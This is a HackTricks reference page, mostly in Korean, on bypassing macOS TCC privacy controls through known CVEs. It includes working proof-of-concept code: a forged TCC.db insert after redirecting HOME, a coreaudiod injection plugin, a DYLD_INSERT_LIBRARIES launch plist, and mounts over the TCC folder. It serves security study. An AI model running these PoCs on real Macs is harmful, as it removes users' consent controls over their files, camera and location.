# macOS TCC Bypasses

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
{% endhint %}
{% endhint %}

## 기능별

### 쓰기 우회

이것은 우회가 아니라 TCC가 작동하는 방식입니다: **쓰기에서 보호하지 않습니다**. 만약 터미널이 **사용자의 바탕화면을 읽을 수 있는 권한이 없다면 여전히 그 안에 쓸 수 있습니다**:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
The **extended attribute `com.apple.macl`**는 새로운 **파일**에 추가되어 **생성자 앱**이 이를 읽을 수 있도록 합니다.

### TCC ClickJacking

사용자가 **알지 못한 채로** TCC 프롬프트 위에 **창을 올려놓는** 것이 가능합니다. [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**에서 PoC를 찾을 수 있습니다.**

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### TCC Request by arbitrary name

공격자는 **`Info.plist`**에서 **임의의 이름**(예: Finder, Google Chrome...)으로 앱을 **생성**하고 TCC 보호 위치에 대한 접근을 요청할 수 있습니다. 사용자는 합법적인 애플리케이션이 이 접근을 요청하고 있다고 생각할 것입니다.\
게다가, **합법적인 앱을 Dock에서 제거하고 가짜 앱을 올려놓는** 것이 가능하므로 사용자가 가짜 앱(같은 아이콘을 사용할 수 있음)을 클릭하면 합법적인 앱을 호출하고 TCC 권한을 요청하여 악성코드를 실행하게 되어 사용자가 합법적인 앱이 접근을 요청했다고 믿게 만들 수 있습니다.

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

자세한 정보와 PoC는 다음에서 확인할 수 있습니다:

{% content-ref url="../../../macos-privilege-escalation.md" %}
[macos-privilege-escalation.md](../../../macos-privilege-escalation.md)
{% endcontent-ref %}

### SSH Bypass

기본적으로 **SSH를 통한 접근은 "전체 디스크 접근"**을 필요로 했습니다. 이를 비활성화하려면 목록에 나열되어 있지만 비활성화되어 있어야 합니다(목록에서 제거해도 이러한 권한은 제거되지 않음):

![](<../../../../../.gitbook/assets/image (1077).png>)

여기에서 일부 **악성코드가 이 보호를 우회할 수 있었던 예시**를 찾을 수 있습니다:

* [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

{% hint style="danger" %}
현재 SSH를 활성화하려면 **전체 디스크 접근**이 필요합니다.
{% endhint %}

### Handle extensions - CVE-2022-26767

속성 **`com.apple.macl`**은 파일에 부여되어 **특정 애플리케이션이 이를 읽을 수 있는 권한을 부여합니다.** 이 속성은 **파일을 앱 위로 드래그 앤 드롭**하거나 사용자가 **더블 클릭**하여 **기본 애플리케이션**으로 파일을 열 때 설정됩니다.

따라서 사용자는 **모든 확장자를 처리하는 악성 앱을 등록**하고 Launch Services를 호출하여 **파일을 열 수 있습니다**(따라서 악성 파일이 읽을 수 있는 접근 권한을 부여받게 됩니다).

### iCloud

권한 **`com.apple.private.icloud-account-access`**를 통해 **`com.apple.iCloudHelper`** XPC 서비스와 통신할 수 있으며, 이 서비스는 **iCloud 토큰**을 제공합니다.

**iMovie**와 **Garageband**는 이 권한을 가지고 있었고, 다른 앱들도 허용되었습니다.

이 권한에서 **icloud 토큰을 얻기 위한 exploit**에 대한 더 많은 **정보**는 다음 강의를 확인하세요: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=\_6e2LhmxVc0)

### kTCCServiceAppleEvents / Automation

**`kTCCServiceAppleEvents`** 권한이 있는 앱은 **다른 앱을 제어할 수 있습니다**. 이는 다른 앱에 부여된 권한을 **남용할 수 있다는 것을 의미합니다**.

Apple Scripts에 대한 더 많은 정보는 다음을 확인하세요:

{% content-ref url="macos-apple-scripts.md" %}
[macos-apple-scripts.md](macos-apple-scripts.md)
{% endcontent-ref %}

예를 들어, 앱이 **`iTerm`**에 대한 **Automation 권한**을 가지고 있다면, 이 예에서 **`Terminal`**이 iTerm에 접근할 수 있습니다:

<figure><img src="../../../../../.gitbook/assets/image (981).png" alt=""><figcaption></figcaption></figure>

#### Over iTerm

FDA가 없는 Terminal은 iTerm을 호출할 수 있으며, 이를 사용하여 작업을 수행할 수 있습니다:

{% code title="iterm.script" %}
```applescript
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```
{% endcode %}
```bash
osascript iterm.script
```
#### Finder를 통한 접근

또는 앱이 Finder에 대한 접근 권한이 있는 경우, 다음과 같은 스크립트를 사용할 수 있습니다:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## By App behaviour

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

사용자 공간 **tccd 데몬**은 **`HOME`** **env** 변수를 사용하여 TCC 사용자 데이터베이스에 접근합니다: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

[이 Stack Exchange 게시물](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686)에 따르면, TCC 데몬은 현재 사용자의 도메인 내에서 `launchd`를 통해 실행되므로, **모든 환경 변수**를 **제어할 수 있습니다**.\
따라서, **공격자는 `$HOME` 환경** 변수를 **`launchctl`**에서 **제어된** **디렉토리**를 가리키도록 설정하고, **TCC** 데몬을 **재시작**한 다음, **TCC 데이터베이스를 직접 수정**하여 **최종 사용자에게 아무런 프롬프트 없이** **모든 TCC 권한**을 부여할 수 있습니다.\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Notes

Notes는 TCC 보호 위치에 접근할 수 있었지만, 노트가 생성될 때 **비보호 위치**에 생성됩니다. 따라서 노트에 보호된 파일을 복사하도록 요청할 수 있으며 (즉, 비보호 위치에) 그 파일에 접근할 수 있습니다:

<figure><img src="../../../../../.gitbook/assets/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

바이너리 `/usr/libexec/lsd`는 `libsecurity_translocate` 라이브러리와 함께 `com.apple.private.nullfs_allow` 권한을 가지고 있어 **nullfs** 마운트를 생성할 수 있었고, 모든 파일에 접근하기 위해 **`kTCCServiceSystemPolicyAllFiles`**와 함께 `com.apple.private.tcc.allow` 권한을 가지고 있었습니다.

"Library"에 격리 속성을 추가하고 **`com.apple.security.translocation`** XPC 서비스를 호출하면 Library가 **`$TMPDIR/AppTranslocation/d/d/Library`**로 매핑되어 Library 내부의 모든 문서에 **접근**할 수 있었습니다.

### CVE-2023-38571 - Music & TV <a href="#cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv" id="cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv"></a>

**`Music`**는 흥미로운 기능을 가지고 있습니다: 실행 중일 때, **`~/Music/Music/Media.localized/Automatically Add to Music.localized`**에 드롭된 파일을 사용자의 "미디어 라이브러리"로 **가져옵니다**. 게다가, **`rename(a, b);`**와 같은 호출을 하며, 여기서 `a`와 `b`는 다음과 같습니다:

* `a = "~/Music/Music/Media.localized/Automatically Add to Music.localized/myfile.mp3"`
* `b = "~/Music/Music/Media.localized/Automatically Add to Music.localized/Not Added.localized/2023-09-25 11.06.28/myfile.mp3`

이 **`rename(a, b);`** 동작은 **경쟁 조건**에 취약하며, `Automatically Add to Music.localized` 폴더에 가짜 **TCC.db** 파일을 넣고, 새 폴더(b)가 생성될 때 파일을 복사하고 삭제한 후 **`~/Library/Application Support/com.apple.TCC`**로 포인터를 설정할 수 있습니다.

### SQLITE\_SQLLOG\_DIR - CVE-2023-32422

**`SQLITE_SQLLOG_DIR="path/folder"`**는 기본적으로 **열려 있는 모든 db가 해당 경로로 복사됨**을 의미합니다. 이 CVE에서는 이 제어가 남용되어 **TCC 데이터베이스를 FDA로 열 프로세스에 의해 열릴** **SQLite 데이터베이스**에 **쓰기**가 이루어졌고, **`SQLITE_SQLLOG_DIR`**를 **파일 이름에 심볼릭 링크**로 남용하여 그 데이터베이스가 **열릴** 때 사용자 **TCC.db가 열려 있는 것으로 덮어씌워졌습니다.**\
**자세한 정보** [**작성물에서**](https://gergelykalman.com/sqlol-CVE-2023-32422-a-macos-tcc-bypass.html) **및** [**강연에서**](https://www.youtube.com/watch?v=f1HA5QhLQ7Y\&t=20548s).

### **SQLITE\_AUTO\_TRACE**

환경 변수 **`SQLITE_AUTO_TRACE`**가 설정되면, 라이브러리 **`libsqlite3.dylib`**는 모든 SQL 쿼리를 **로깅**하기 시작합니다. 많은 애플리케이션이 이 라이브러리를 사용했기 때문에, 그들의 모든 SQLite 쿼리를 로깅할 수 있었습니다.

여러 애플리케이션이 TCC 보호 정보를 접근하기 위해 이 라이브러리를 사용했습니다.
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### MTL\_DUMP\_PIPELINES\_TO\_JSON\_FILE - CVE-2023-32407

이 **환경 변수는 `Metal` 프레임워크에 의해 사용됩니다**. 이는 여러 프로그램의 의존성으로, 특히 FDA가 있는 `Music`에서 두드러집니다.

다음과 같이 설정합니다: `MTL_DUMP_PIPELINES_TO_JSON_FILE="path/name"`. 만약 `path`가 유효한 디렉토리라면, 버그가 발생하고 `fs_usage`를 사용하여 프로그램에서 무슨 일이 일어나고 있는지 볼 수 있습니다:

* `path/.dat.nosyncXXXX.XXXXXX`라는 파일이 `open()`됩니다 (X는 랜덤)
* 하나 이상의 `write()`가 파일에 내용을 씁니다 (우리는 이를 제어하지 않습니다)
* `path/.dat.nosyncXXXX.XXXXXX`가 `path/name`으로 `renamed()`됩니다

이는 임시 파일 쓰기 후 **`rename(old, new)`** **가 안전하지 않습니다.**

안전하지 않은 이유는 **구 경로와 신 경로를 별도로 해결해야 하기 때문**이며, 이는 시간이 걸릴 수 있고 경쟁 조건에 취약할 수 있습니다. 더 많은 정보는 `xnu` 함수 `renameat_internal()`을 확인할 수 있습니다.

{% hint style="danger" %}
기본적으로, 만약 권한이 있는 프로세스가 당신이 제어하는 폴더에서 이름을 바꾸면, RCE를 얻을 수 있고 다른 파일에 접근하게 하거나, 이 CVE와 같이 권한 있는 앱이 생성한 파일을 열고 FD를 저장할 수 있습니다.

이름 바꾸기가 당신이 제어하는 폴더에 접근하면, 소스 파일을 수정했거나 그에 대한 FD가 있는 동안, 목적지 파일(또는 폴더)을 심볼릭 링크를 가리키도록 변경하여 원하는 때에 쓸 수 있습니다.
{% endhint %}

이것이 CVE에서의 공격이었습니다: 예를 들어, 사용자의 `TCC.db`를 덮어쓰려면 다음을 수행할 수 있습니다:

* `/Users/hacker/ourlink`를 `/Users/hacker/Library/Application Support/com.apple.TCC/`를 가리키도록 생성합니다.
* `/Users/hacker/tmp/` 디렉토리를 생성합니다.
* `MTL_DUMP_PIPELINES_TO_JSON_FILE=/Users/hacker/tmp/TCC.db`로 설정합니다.
* 이 환경 변수를 사용하여 `Music`을 실행하여 버그를 유발합니다.
* `/Users/hacker/tmp/.dat.nosyncXXXX.XXXXXX`의 `open()`을 포착합니다 (X는 랜덤)
* 여기서 우리는 이 파일을 쓰기 위해 `open()`하고 파일 디스크립터를 유지합니다.
* `/Users/hacker/tmp`를 `/Users/hacker/ourlink`와 **루프에서 원자적으로 전환**합니다.
* 경쟁 창이 매우 좁기 때문에 성공할 확률을 극대화하기 위해 이렇게 하며, 경쟁에서 지는 것은 미미한 단점이 있습니다.
* 잠시 기다립니다.
* 운이 좋았는지 테스트합니다.
* 그렇지 않으면 처음부터 다시 실행합니다.

자세한 정보는 [https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html](https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html)에서 확인할 수 있습니다.

{% hint style="danger" %}
이제, 환경 변수 `MTL_DUMP_PIPELINES_TO_JSON_FILE`를 사용하려고 하면 앱이 실행되지 않습니다.
{% endhint %}

### Apple Remote Desktop

루트로 이 서비스를 활성화하면 **ARD 에이전트가 전체 디스크 접근 권한을 가지게 되며**, 이는 사용자가 새로운 **TCC 사용자 데이터베이스**를 복사하도록 악용될 수 있습니다.

## **NFSHomeDirectory**에 의해

TCC는 사용자의 HOME 폴더에 있는 데이터베이스를 사용하여 **$HOME/Library/Application Support/com.apple.TCC/TCC.db**에서 사용자에게 특정 리소스에 대한 접근을 제어합니다.\
따라서 사용자가 $HOME 환경 변수를 **다른 폴더**를 가리키도록 재시작하면, 사용자는 **/Library/Application Support/com.apple.TCC/TCC.db**에 새로운 TCC 데이터베이스를 생성하고 TCC를 속여 모든 TCC 권한을 모든 앱에 부여할 수 있습니다.

{% hint style="success" %}
Apple은 **`NFSHomeDirectory`** 속성에 저장된 설정을 **`$HOME`**의 값으로 사용하므로, 이 값을 수정할 수 있는 권한이 있는 애플리케이션을 손상시키면 (**`kTCCServiceSystemPolicySysAdminFiles`**), TCC 우회와 함께 이 옵션을 **무기화**할 수 있습니다.
{% endhint %}

### [CVE-2020–9934 - TCC](./#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](./#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**첫 번째 POC**는 [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/)와 [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/)를 사용하여 사용자의 **HOME** 폴더를 수정합니다.

1. 대상 앱에 대한 _csreq_ 블롭을 가져옵니다.
2. 필요한 접근 권한과 _csreq_ 블롭이 포함된 가짜 _TCC.db_ 파일을 심습니다.
3. [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/)를 사용하여 사용자의 디렉토리 서비스 항목을 내보냅니다.
4. 사용자의 홈 디렉토리를 변경하기 위해 디렉토리 서비스 항목을 수정합니다.
5. [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/)를 사용하여 수정된 디렉토리 서비스 항목을 가져옵니다.
6. 사용자의 _tccd_를 중지하고 프로세스를 재부팅합니다.

두 번째 POC는 **`/usr/libexec/configd`**를 사용했으며, 여기에는 `com.apple.private.tcc.allow`가 `kTCCServiceSystemPolicySysAdminFiles` 값으로 설정되어 있었습니다.\
**`-t`** 옵션으로 **`configd`**를 실행할 수 있었고, 공격자는 **로드할 사용자 정의 번들을 지정**할 수 있었습니다. 따라서 이 익스플로잇은 사용자의 홈 디렉토리를 변경하는 **`dsexport`** 및 **`dsimport`** 방법을 **`configd` 코드 주입**으로 대체합니다.

자세한 정보는 [**원본 보고서**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)를 확인하세요.

## 프로세스 주입에 의해

프로세스 내부에 코드를 주입하고 TCC 권한을 악용하는 다양한 기술이 있습니다:

{% content-ref url="../../../macos-proces-abuse/" %}
[macos-proces-abuse](../../../macos-proces-abuse/)
{% endcontent-ref %}

게다가, TCC를 우회하기 위해 발견된 가장 일반적인 프로세스 주입은 **플러그인(로드 라이브러리)**을 통해 이루어집니다.\
플러그인은 일반적으로 라이브러리나 plist 형태의 추가 코드로, **주 애플리케이션에 의해 로드**되며 그 컨텍스트에서 실행됩니다. 따라서 주 애플리케이션이 TCC 제한 파일에 대한 접근 권한을 가졌다면 (부여된 권한이나 자격을 통해), **사용자 정의 코드도 이를 가집니다**.

### CVE-2020-27937 - Directory Utility

애플리케이션 `/System/Library/CoreServices/Applications/Directory Utility.app`는 **`kTCCServiceSystemPolicySysAdminFiles`** 권한을 가지고 있으며, **`.daplug`** 확장자를 가진 플러그인을 로드하고 **강화된** 런타임이 없습니다.

이 CVE를 무기화하기 위해 **`NFSHomeDirectory`**가 **변경**됩니다 (이전 권한을 악용하여) 사용자의 TCC 데이터베이스를 **장악**하여 TCC를 우회할 수 있습니다.

자세한 정보는 [**원본 보고서**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)를 확인하세요.

### CVE-2020-29621 - Coreaudiod

바이너리 **`/usr/sbin/coreaudiod`**는 `com.apple.security.cs.disable-library-validation` 및 `com.apple.private.tcc.manager` 권한을 가지고 있었습니다. 첫 번째는 **코드 주입을 허용**하고 두 번째는 **TCC를 관리할 수 있는 접근 권한을 부여**합니다.

이 바이너리는 **/Library/Audio/Plug-Ins/HAL** 폴더에서 **타사 플러그인**을 로드할 수 있었습니다. 따라서 이 PoC로 **플러그인을 로드하고 TCC 권한을 악용**할 수 있었습니다:
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
더 많은 정보는 [**원본 보고서**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)를 확인하세요.

### 장치 추상화 계층 (DAL) 플러그인

Core Media I/O를 통해 카메라 스트림을 여는 시스템 애플리케이션(**`kTCCServiceCamera`**가 있는 앱)은 `/Library/CoreMediaIO/Plug-Ins/DAL`에 위치한 **이 플러그인들을 프로세스 내에서 로드**합니다 (SIP 제한 없음).

여기에 일반 **생성자**가 포함된 라이브러리를 저장하는 것만으로도 **코드를 주입**할 수 있습니다.

여러 Apple 애플리케이션이 이에 취약했습니다.

### Firefox

Firefox 애플리케이션은 `com.apple.security.cs.disable-library-validation` 및 `com.apple.security.cs.allow-dyld-environment-variables` 권한을 가지고 있었습니다:
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
더 많은 정보는 [**원본 보고서를 확인하세요**](https://wojciechregula.blog/post/how-to-rob-a-firefox/)에서 확인할 수 있습니다.

### CVE-2020-10006

바이너리 `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl`는 **`com.apple.private.tcc.allow`** 및 **`com.apple.security.get-task-allow`** 권한을 가지고 있어, 프로세스 내에 코드를 주입하고 TCC 권한을 사용할 수 있었습니다.

### CVE-2023-26818 - 텔레그램

텔레그램은 **`com.apple.security.cs.allow-dyld-environment-variables`** 및 **`com.apple.security.cs.disable-library-validation`** 권한을 가지고 있어, 이를 악용하여 **카메라로 녹화하는 등의 권한에 접근**할 수 있었습니다. [**페이로드는 작성물에서 확인할 수 있습니다**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).

환경 변수를 사용하여 라이브러리를 로드하는 방법에 주목하세요. **커스텀 plist**가 생성되어 이 라이브러리를 주입하고 **`launchctl`**을 사용하여 실행되었습니다:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## By open invocations

**`open`**을 샌드박스 상태에서도 호출할 수 있습니다.

### Terminal Scripts

기술자들이 사용하는 컴퓨터에서는 터미널에 **전체 디스크 접근 (FDA)** 권한을 부여하는 것이 일반적입니다. 그리고 이를 사용하여 **`.terminal`** 스크립트를 호출할 수 있습니다.

**`.terminal`** 스크립트는 **`CommandString`** 키에 실행할 명령이 포함된 plist 파일입니다:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
애플리케이션은 /tmp와 같은 위치에 터미널 스크립트를 작성하고 다음과 같은 명령으로 실행할 수 있습니다:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## By mounting

### CVE-2020-9771 - mount\_apfs TCC 우회 및 권한 상승

**모든 사용자** (특권이 없는 사용자 포함)는 타임 머신 스냅샷을 생성하고 마운트하여 **해당 스냅샷의 모든 파일에 접근**할 수 있습니다.\
필요한 **유일한 특권**은 사용되는 애플리케이션(예: `Terminal`)이 **전체 디스크 접근** (FDA) 권한(`kTCCServiceSystemPolicyAllfiles`)을 가져야 하며, 이는 관리자가 부여해야 합니다.

{% code overflow="wrap" %}
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
{% endcode %}

더 자세한 설명은 [**원본 보고서에서 확인할 수 있습니다**](https://theevilbit.github.io/posts/cve\_2020\_9771/)**.**

### CVE-2021-1784 & CVE-2021-30808 - TCC 파일 위에 마운트

TCC DB 파일이 보호되어 있더라도, 새로운 TCC.db 파일을 **디렉토리 위에 마운트하는** 것이 가능했습니다:

{% code overflow="wrap" %}
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```
{% endcode %}
```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
Check the **full exploit** in the [**original writeup**](https://theevilbit.github.io/posts/cve-2021-30808/).

### asr

The tool **`/usr/sbin/asr`** allowed to copy the whole disk and mount it in another place bypassing TCC protections.

### Location Services

There is a third TCC database in **`/var/db/locationd/clients.plist`** to indicate clients allowed to **access location services**.\
The folder **`/var/db/locationd/` wasn't protected from DMG mounting** so it was possible to mount our own plist.

## By startup apps

{% content-ref url="../../../../macos-auto-start-locations.md" %}
[macos-auto-start-locations.md](../../../../macos-auto-start-locations.md)
{% endcontent-ref %}

## By grep

In several occasions files will store sensitive information like emails, phone numbers, messages... in non protected locations (which count as a vulnerability in Apple).

<figure><img src="../../../../../.gitbook/assets/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

This doesn't work anymore, but it [**did in the past**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>

Another way using [**CoreGraphics events**](https://objectivebythesea.org/v2/talks/OBTS\_v2\_Wardle.pdf):

<figure><img src="../../../../../.gitbook/assets/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## Reference

* [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
* [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
* [**20+ Ways to Bypass Your macOS Privacy Mechanisms**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
* [**Knockout Win Against TCC - 20+ NEW Ways to Bypass Your MacOS Privacy Mechanisms**](https://www.youtube.com/watch?v=a9hsxPdRxsY)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
